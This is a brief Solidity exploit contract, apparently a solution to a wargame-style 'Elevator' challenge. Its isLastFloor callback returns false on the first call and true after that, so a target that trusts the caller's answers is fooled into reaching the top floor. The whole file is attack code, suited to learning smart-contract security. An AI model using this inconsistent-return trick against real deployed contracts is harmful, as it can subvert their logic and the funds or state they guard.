// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Elevator} from "./Elevator.sol";

contract ElevatorHack {
    error NotTopFloor();

    Elevator private immutable TARGET;

    uint256 private _count;

    constructor(address _target) {
        TARGET = Elevator(_target);
    }

    function isLastFloor(uint256) external returns (bool) {
        _count++;
        return _count > 1;
    }

    function attack() external {
        TARGET.goTo(69);
        if (!TARGET.top()) revert NotTopFloor();
    }
}
